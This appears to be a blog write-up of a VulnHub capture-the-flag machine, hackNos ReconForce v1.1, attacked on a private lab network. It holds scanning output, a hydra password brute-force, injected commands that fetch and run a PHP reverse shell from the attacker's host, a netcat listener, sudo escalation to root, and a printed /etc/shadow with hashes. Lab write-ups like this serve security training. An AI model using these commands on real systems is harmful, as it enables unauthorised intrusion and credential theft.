<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>
/f0c1s/blog/sec/vulnhub/hackNos-reconforce-1.1
</title>
<link rel="stylesheet" href="../../../index.css"/> <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
<script src="../../../highlight/highlight.min.js"></script>
<script src="../../../setup.js"></script>
<script>hljs.highlightAll();</script>
</head>
<body onload="setup()">
<h1>
/f0c1s/blog/sec/vulnhub/hackNos-reconforce-1.1
</h1>
<nav>
<a href="../../../index.html">/blog</a> <a href="../../index.html">Security</a> <a href="../index.html">VulnHub</a> <a href="../../../sec/vulnhub/hackNos-ReconForce-1.1/hackNos-ReconForce-1.1.html">+ hackNos: reconforce v1.1 - 2022.01.01 Saturday</a>
</nav>
<h2 id="description">Description</h2>
<blockquote>
<p>Good Enumeration Skills</p>
<p>Difficulty: Easy to Intermediate</p>
<p>Flag: 2 Flag first user And the second root</p>
<p>Learning: Web Application | Enumeration | Privilege Escalation</p>
<p>Web-site: www.hacknos.com</p>
<p>Contact-us</p>
<p>Twitter: <span class="citation" data-cites="rahul_gehlaut">@rahul_gehlaut</span> ## Changelog v1.1 - 2020-01-18 v1.0 - 2020-01-11</p>
</blockquote>
<p><a href="https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/">VulnHub: https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/</a> <a href="https://www.vulnhub.com/series/hacknos,257/">Series: https://www.vulnhub.com/series/hacknos,257/</a></p>
<figure>
<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
</figure>
<h2 id="scanning">Scanning</h2>
<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.60
192.168.56.70
</code></pre>
<pre class="shell"><code>sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
[sudo] password for f0c1s:
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.56.2    08:00:27:11:4f:2a      1      60  PCS Systemtechnik GmbH
 192.168.56.60   08:00:27:9d:aa:10      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 3 Hosts found.
</code></pre>
<pre class="shell"><code>sudo arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 08:00:27:13:e5:7a, IPv4: 192.168.56.70
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.2    08:00:27:11:4f:2a       PCS Systemtechnik GmbH
192.168.56.60   08:00:27:9d:aa:10       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 3 responded
</code></pre>
<pre class="shell"><code>nmap 192.168.56.1/24 -sn -n
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:54 IST
Nmap scan report for 192.168.56.60
Host is up (0.0016s latency).
Nmap scan report for 192.168.56.70
Host is up (0.0017s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.51 seconds
</code></pre>
<pre class="shell"><code>export RHOST=&quot;192.168.56.60&quot;
export LHOST=&quot;192.168.56.70&quot;
export LPORT=&quot;443&quot;
</code></pre>
<pre class="shell"><code>_n $RHOST
firing nmap 192.168.56.60 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:55 IST
Nmap scan report for 192.168.56.60
Host is up (0.00026s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
</code></pre>
<pre class="shell"><code>_ntd $RHOST
firing nmap 192.168.56.60 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 09:55 IST
Nmap scan report for 192.168.56.60
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)
|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)
|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Recon_Web
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
</code></pre>
<h2 id="ftp">FTP</h2>
<pre class="shell"><code>ftp -p $RHOST 21
Connected to 192.168.56.60.
220 &quot;Security@hackNos&quot;.
Name (192.168.56.60:f0c1s): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||34458|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        117          4096 Jan 06  2020 .
drwxr-xr-x    2 0        117          4096 Jan 06  2020 ..
226 Directory send OK.
ftp&gt; pwd
Remote directory: /
ftp&gt; cwd
?Invalid command.
ftp&gt; dir
229 Entering Extended Passive Mode (|||55040|)
150 Here comes the directory listing.
226 Directory send OK.
ftp&gt; exit
221 Goodbye.
</code></pre>
<p>There is nothing here. Maybe I can upload something?</p>
<pre class="shell"><code>cp ~/collected-tools/php-reverse-shell/php-reverse-shell.php rshell.php
</code></pre>
<pre class="shell"><code>ftp -p $RHOST 21
Connected to 192.168.56.60.
220 &quot;Security@hackNos&quot;.
Name (192.168.56.60:f0c1s): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; put rshell.php
local: rshell.php remote: rshell.php
229 Entering Extended Passive Mode (|||26312|)
550 Permission denied.
ftp&gt; passive
Passive mode: off; fallback to active mode: off.
ftp&gt; put rshell.php
local: rshell.php remote: rshell.php
200 EPRT command successful. Consider using EPSV.
550 Permission denied.
ftp&gt; exit
221 Goodbye.
</code></pre>
<h2 id="attacking-ssh">Attacking SSH</h2>
<pre class="shell"><code>ssh root@$RHOST
The authenticity of host &#39;192.168.56.60 (192.168.56.60)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:wnj/RTNHqFD0k0kZlCBtCwiBzGMt8nAMig6bZc4j5is.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;192.168.56.60&#39; (ED25519) to the list of known hosts.
root@192.168.56.60&#39;s password:
Permission denied, please try again.
root@192.168.56.60&#39;s password:

</code></pre>
<p>Without password there is no access.</p>
<h2 id="attacking-web">Attacking web</h2>
<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.60
+ Target Hostname:    192.168.56.60
+ Target Port:        80
+ Start Time:         2022-01-01 09:56:03 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: 294, size: 59bd0f09b74ac, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ 26523 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-01-01 09:57:28 (GMT5.5) (85 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre>
<figure>
<img src="1.css-directory.png" alt="" /><figcaption>1.css-directory</figcaption>
</figure>
<h3 id="is-css-actually-whitespace-code">Is CSS actually whitespace code?</h3>
<figure>
<img src="2.nope-no-whitespace-code.png" alt="" /><figcaption>2.nope-no-whitespace-code</figcaption>
</figure>
<p>The weird formatting of CSS file hinted towards it.</p>
<h3 id="does-image-have-anything-hidden">Does image have anything hidden</h3>
<pre class="shell"><code>wget -q http://192.168.56.60/css/2.jpg
</code></pre>
<pre class="shell"><code>ls
2.jpg  fping.txt  nikto.txt  nmap.default.txt  nmap.tcp-ports.deep.txt
</code></pre>
<pre class="shell"><code>exiftool 2.jpg
ExifTool Version Number         : 12.36
File Name                       : 2.jpg
Directory                       : .
File Size                       : 490 KiB
File Modification Date/Time     : 2019:03:01 07:54:37+05:30
File Access Date/Time           : 2022:01:01 10:08:47+05:30
File Inode Change Date/Time     : 2022:01:01 10:08:47+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1281
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1281
Megapixels                      : 2.5
</code></pre>
<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
301        9l       28w      312c http://192.168.56.60/css
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_60-1641012029.state ...
Scanning: http://192.168.56.60
Scanning: http://192.168.56.60/css
</code></pre>
<p>Nothing here.</p>
<h3 id="source-code">Source code</h3>
<figure>
<img src="3.found-a-directory.png" alt="" /><figcaption>3.found-a-directory</figcaption>
</figure>
<figure>
<img src="4.auth-prompt.png" alt="" /><figcaption>4.auth-prompt</figcaption>
</figure>
<figure>
<img src="5.unauthorized.png" alt="" /><figcaption>5.unauthorized</figcaption>
</figure>
<div class="sourceCode" id="cb17"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a><span class="dt">&lt;!DOCTYPE </span>HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;<span class="dt">&gt;</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a><span class="kw">&lt;html&gt;&lt;head&gt;</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a><span class="kw">&lt;title&gt;</span>401 Unauthorized<span class="kw">&lt;/title&gt;</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a><span class="kw">&lt;/head&gt;&lt;body&gt;</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true"></a><span class="kw">&lt;h1&gt;</span>Unauthorized<span class="kw">&lt;/h1&gt;</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true"></a><span class="kw">&lt;p&gt;</span>This server could not verify that you</span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true"></a>are authorized to access the document</span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true"></a>requested.  Either you supplied the wrong</span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true"></a>credentials (e.g., bad password), or your</span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true"></a>browser doesn&#39;t understand how to supply</span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true"></a>the credentials required.<span class="kw">&lt;/p&gt;</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true"></a><span class="kw">&lt;hr&gt;</span></span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true"></a><span class="kw">&lt;address&gt;</span>Apache/2.4.41 (Ubuntu) Server at 192.168.56.60 Port 80<span class="kw">&lt;/address&gt;</span></span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true"></a><span class="kw">&lt;/body&gt;&lt;/html&gt;</span></span></code></pre></div>
<p>I can try to attack the auth mechanism via hydra, but I don’t have a username.</p>
<h2 id="look-at-the-output-ben">Look at the output Ben</h2>
<p>Well, I didn’t look at the ftp output. There is this string: “Security@hackNos”. It could be username or password.</p>
<p>We have a login form. Here are a few things I can try:</p>
<ul>
<li>Security:hackNos</li>
<li>admin:Security@hackNos</li>
<li>Security@hackNos:admin</li>
</ul>
<h2 id="hydra">hydra</h2>
<pre class="shell"><code>cat users.txt
Security@hackNos
Security
admin
ftp
anonymous
</code></pre>
<pre class="shell"><code>cat passwords.txt
Security@hackNos
hackNos
admin
anonymous
</code></pre>
<pre class="shell"><code>hydra -L users.txt -P passwords.txt $RHOST -s 80 http-get &quot;/5ecure&quot;
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:40:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking http-get://192.168.56.60:80/5ecure
[80][http-get] host: 192.168.56.60   login: admin   password: Security@hackNos
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:40:41
</code></pre>
<pre class="shell"><code>hydra -L users.txt -P passwords.txt $RHOST ftp
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:41:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ftp://192.168.56.60:21/
[21][ftp] host: 192.168.56.60   login: ftp   password: Security@hackNos
[21][ftp] host: 192.168.56.60   login: ftp   password: hackNos
[21][ftp] host: 192.168.56.60   login: ftp   password: admin
[21][ftp] host: 192.168.56.60   login: ftp   password: anonymous
[21][ftp] host: 192.168.56.60   login: anonymous   password: Security@hackNos
[21][ftp] host: 192.168.56.60   login: anonymous   password: hackNos
[21][ftp] host: 192.168.56.60   login: anonymous   password: admin
[21][ftp] host: 192.168.56.60   login: anonymous   password: anonymous
1 of 1 target successfully completed, 8 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:41:11
</code></pre>
<p>This basically means that ftp server is allowing anonymous login with ftp or anonymous as users.</p>
<pre class="shell"><code>hydra -L users.txt -P passwords.txt $RHOST ssh
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:41:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ssh://192.168.56.60:22/
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:41:20
</code></pre>
<figure>
<img src="6.hydra.png" alt="" /><figcaption>6.hydra</figcaption>
</figure>
<h2 id="webshell">webshell</h2>
<p>There is poor man’s webshell after logging in as admin:Security@hackNos</p>
<figure>
<img src="7.poor-mans-webshell.png" alt="" /><figcaption>7.poor-mans-webshell</figcaption>
</figure>
<figure>
<img src="8.localhost-ping-results.png" alt="" /><figcaption>8.localhost-ping-results</figcaption>
</figure>
<h2 id="rfi">RFI</h2>
<pre><code>|wget 192.168.56.70/not_found
|wget 192.168.56.70/rshell.php</code></pre>
<pre class="shell"><code>python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.60 - - [01/Jan/2022 10:52:31] code 404, message File not found
192.168.56.60 - - [01/Jan/2022 10:52:31] &quot;GET /not_found HTTP/1.1&quot; 404 -
192.168.56.60 - - [01/Jan/2022 10:53:39] &quot;GET /rshell.php HTTP/1.1&quot; 200 -
^C
Keyboard interrupt received, exiting.
</code></pre>
<h2 id="reverse-shell">Reverse shell</h2>
<pre><code>|php rshell.php</code></pre>
<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
[sudo] password for f0c1s:
Listening on 192.168.56.70 443
Connection received on 192.168.56.60 50590
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:54:36 up  1:02,  0 users,  load average: 0.07, 0.02, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can&#39;t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ hostname
hacknos
$ date
Sat Jan  1 10:54:57 UTC 2022
$</code></pre>
<figure>
<img src="9.caught-a-reverse-shell.png" alt="" /><figcaption>9.caught-a-reverse-shell</figcaption>
</figure>
<h3 id="pty">pty</h3>
<pre class="shell"><code>$ which python
/usr/bin/python
$ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
www-data@hacknos:/home/recon$</code></pre>
<h3 id="home-users">/home users</h3>
<pre class="shell"><code>www-data@hacknos:/home/recon$ cat /etc/passwd | grep /home
cat /etc/passwd | grep /home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
recon:x:1000:119:rahul:/home/recon:/bin/bash
</code></pre>
<h3 id="varwwwrecon5ecureout.php">/var/www/recon/5ecure/out.php</h3>
<div class="sourceCode" id="cb29"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a><span class="kw">&lt;?php</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a></span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a><span class="kw">if</span><span class="ot">(</span> <span class="kw">isset</span><span class="ot">(</span> <span class="kw">$_POST</span><span class="ot">[</span> <span class="st">&#39;Submit&#39;</span> <span class="ot">]</span>  <span class="ot">)</span> <span class="ot">)</span> {</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a>    <span class="co">// Get input</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a>    <span class="kw">$target</span> = <span class="fu">trim</span><span class="ot">(</span><span class="kw">$_REQUEST</span><span class="ot">[</span> <span class="st">&#39;ip&#39;</span> <span class="ot">]);</span></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true"></a>    <span class="co">// Set blacklist</span></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true"></a>    <span class="kw">$substitutions</span> = <span class="kw">array</span><span class="ot">(</span></span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true"></a>        <span class="st">&#39;&amp;&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true"></a>        <span class="st">&#39;;&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-11"><a href="#cb29-11" aria-hidden="true"></a>        <span class="st">&#39;| &#39;</span> =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-12"><a href="#cb29-12" aria-hidden="true"></a>        <span class="st">&#39;-&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-13"><a href="#cb29-13" aria-hidden="true"></a>        <span class="st">&#39;$&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-14"><a href="#cb29-14" aria-hidden="true"></a>        <span class="st">&#39;(&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-15"><a href="#cb29-15" aria-hidden="true"></a>        <span class="st">&#39;)&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-16"><a href="#cb29-16" aria-hidden="true"></a>        <span class="st">&#39;`&#39;</span>  =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-17"><a href="#cb29-17" aria-hidden="true"></a>        <span class="st">&#39;||&#39;</span> =&gt; <span class="st">&#39;&#39;</span><span class="ot">,</span></span>
<span id="cb29-18"><a href="#cb29-18" aria-hidden="true"></a>    <span class="ot">);</span></span>
<span id="cb29-19"><a href="#cb29-19" aria-hidden="true"></a></span>
<span id="cb29-20"><a href="#cb29-20" aria-hidden="true"></a>    <span class="co">// Remove any of the charactars in the array (blacklist).</span></span>
<span id="cb29-21"><a href="#cb29-21" aria-hidden="true"></a>    <span class="kw">$target</span> = <span class="fu">str_replace</span><span class="ot">(</span> <span class="fu">array_keys</span><span class="ot">(</span> <span class="kw">$substitutions</span> <span class="ot">),</span> <span class="kw">$substitutions</span><span class="ot">,</span> <span class="kw">$target</span> <span class="ot">);</span></span>
<span id="cb29-22"><a href="#cb29-22" aria-hidden="true"></a></span>
<span id="cb29-23"><a href="#cb29-23" aria-hidden="true"></a>    <span class="co">// Determine OS and execute the ping command.</span></span>
<span id="cb29-24"><a href="#cb29-24" aria-hidden="true"></a>    <span class="kw">if</span><span class="ot">(</span> <span class="fu">stristr</span><span class="ot">(</span> <span class="fu">php_uname</span><span class="ot">(</span> <span class="st">&#39;s&#39;</span> <span class="ot">),</span> <span class="st">&#39;Windows NT&#39;</span> <span class="ot">)</span> <span class="ot">)</span> {</span>
<span id="cb29-25"><a href="#cb29-25" aria-hidden="true"></a>        <span class="co">// Windows</span></span>
<span id="cb29-26"><a href="#cb29-26" aria-hidden="true"></a>        <span class="kw">$cmd</span> = <span class="fu">shell_exec</span><span class="ot">(</span> <span class="st">&#39;ping  &#39;</span> . <span class="kw">$target</span> <span class="ot">);</span></span>
<span id="cb29-27"><a href="#cb29-27" aria-hidden="true"></a>    }</span>
<span id="cb29-28"><a href="#cb29-28" aria-hidden="true"></a>    <span class="kw">else</span> {</span>
<span id="cb29-29"><a href="#cb29-29" aria-hidden="true"></a>        <span class="co">// *nix</span></span>
<span id="cb29-30"><a href="#cb29-30" aria-hidden="true"></a>        <span class="kw">$cmd</span> = <span class="fu">shell_exec</span><span class="ot">(</span> <span class="st">&#39;ping  -c 4 &#39;</span> . <span class="kw">$target</span> <span class="ot">);</span></span>
<span id="cb29-31"><a href="#cb29-31" aria-hidden="true"></a>    }</span>
<span id="cb29-32"><a href="#cb29-32" aria-hidden="true"></a></span>
<span id="cb29-33"><a href="#cb29-33" aria-hidden="true"></a>    <span class="co">// Feedback for the end user</span></span>
<span id="cb29-34"><a href="#cb29-34" aria-hidden="true"></a>    <span class="kw">echo</span> <span class="st">&quot;&lt;pre&gt;</span><span class="kw">{$cmd}</span><span class="st">&lt;/pre&gt;&quot;</span><span class="ot">;</span></span>
<span id="cb29-35"><a href="#cb29-35" aria-hidden="true"></a>}</span>
<span id="cb29-36"><a href="#cb29-36" aria-hidden="true"></a></span>
<span id="cb29-37"><a href="#cb29-37" aria-hidden="true"></a><span class="kw">?&gt;</span></span></code></pre></div>
<h3 id="systeminfo">systeminfo</h3>
<pre class="shell"><code>www-data@hacknos:/$ uname -a
uname -a
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@hacknos:/$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=19.10
DISTRIB_CODENAME=eoan
DISTRIB_DESCRIPTION=&quot;Ubuntu 19.10&quot;
NAME=&quot;Ubuntu&quot;
VERSION=&quot;19.10 (Eoan Ermine)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 19.10&quot;
VERSION_ID=&quot;19.10&quot;
HOME_URL=&quot;https://www.ubuntu.com/&quot;
SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
VERSION_CODENAME=eoan
UBUNTU_CODENAME=eoan</code></pre>
<h2 id="root">Root</h2>
<pre class="shell"><code>www-data@hacknos:/$ su recon
su recon
Password: Security@hackNos

recon@hacknos:/$ sudo -l
sudo -l
[sudo] password for recon: Security@hackNos

Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL
recon@hacknos:/$ sudo bash -i
sudo bash -i
root@hacknos:/# whoami
whoami
root
root@hacknos:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:/# hostname
hostname
hacknos
root@hacknos:/# date
date
Sat 01 Jan 2022 11:15:41 AM UTC
root@hacknos:/# cat /etc/shadow
cat /etc/shadow
root:$6$81XnMBZhj4s7PUbZ$oXgkpES1EwkWwk/47iHKsCPxC6mlaG2lqPj2K2dcqxHd/n5skrZ/KTEsIWP5AEdsRFjd.h6oUXZK55QSbi7Lh.:18271:0:99999:7:::
daemon:*:18186:0:99999:7:::
bin:*:18186:0:99999:7:::
sys:*:18186:0:99999:7:::
sync:*:18186:0:99999:7:::
games:*:18186:0:99999:7:::
man:*:18186:0:99999:7:::
lp:*:18186:0:99999:7:::
mail:*:18186:0:99999:7:::
news:*:18186:0:99999:7:::
uucp:*:18186:0:99999:7:::
proxy:*:18186:0:99999:7:::
www-data:*:18186:0:99999:7:::
backup:*:18186:0:99999:7:::
list:*:18186:0:99999:7:::
irc:*:18186:0:99999:7:::
gnats:*:18186:0:99999:7:::
nobody:*:18186:0:99999:7:::
systemd-timesync:*:18186:0:99999:7:::
systemd-network:*:18186:0:99999:7:::
systemd-resolve:*:18186:0:99999:7:::
messagebus:*:18186:0:99999:7:::
syslog:*:18186:0:99999:7:::
_apt:*:18186:0:99999:7:::
uuidd:*:18186:0:99999:7:::
tcpdump:*:18186:0:99999:7:::
landscape:*:18186:0:99999:7:::
pollinate:*:18186:0:99999:7:::
sshd:*:18267:0:99999:7:::
systemd-coredump:!!:18267::::::
recon:$6$e3kpkVkMU5.i8kCu$GdUZ5tPcXWBbXaFDekVWqMB.CDBWbZAdW4VU5acfPTjpki4lqckCofK6qjfO7dF0AMBNA.Lw61Kr1IXczvTLM.:18271:0:99999:7:::
lxd:!:18267::::::
ftp:$6$XzGaISMJDIacZa9Y$DU1IjrBSBR11rWcc//ovH1qS082XDeC1Xi5Z8LHdjl.K..drbahsOmQxSVIeuwXJwVYsobC8BXWtnnKfzi.80.:18271:0:99999:7:::
mysql:!:18271:0:99999:7:::
dnsmasq:*:18271:0:99999:7:::</code></pre>
<p>Rooted.</p>
<h2 id="ssh">SSH</h2>
<pre class="shell"><code>ssh recon@$RHOST
recon@192.168.56.60&#39;s password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 01 Jan 2022 11:17:26 AM UTC

  System load:  0.05              Processes:             130
  Usage of /:   31.5% of 9.22GB   Users logged in:       0
  Memory usage: 7%                IP address for enp0s3: 192.168.56.60
  Swap usage:   0%

  =&gt; There is 1 zombie process.


31 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jan 10 23:05:02 2020 from 192.168.0.104
recon@hacknos:~$ whoami
recon
recon@hacknos:~$ id
uid=1000(recon) gid=119(docker) groups=119(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
recon@hacknos:~$ date
Sat 01 Jan 2022 11:17:32 AM UTC
recon@hacknos:~$ hostname
hacknos
recon@hacknos:~$ sudo -l
[sudo] password for recon:
Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL
recon@hacknos:~$ sudo bash
root@hacknos:/home/recon# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:/home/recon# whoami
root
root@hacknos:/home/recon# exit
exit
recon@hacknos:~$ exit
logout
Connection to 192.168.56.60 closed.
</code></pre>
<figure>
<img src="10.rooted.png" alt="" /><figcaption>10.rooted</figcaption>
</figure>
<h2 id="how-to-hack">How to hack</h2>
<ol type="1">
<li>Find hidden web directory</li>
<li>Find password via enumerating other services.</li>
<li>Upload reverse shell via your web server.</li>
<li>Execute reverse shell script and catch a shell.</li>
<li>Find users.</li>
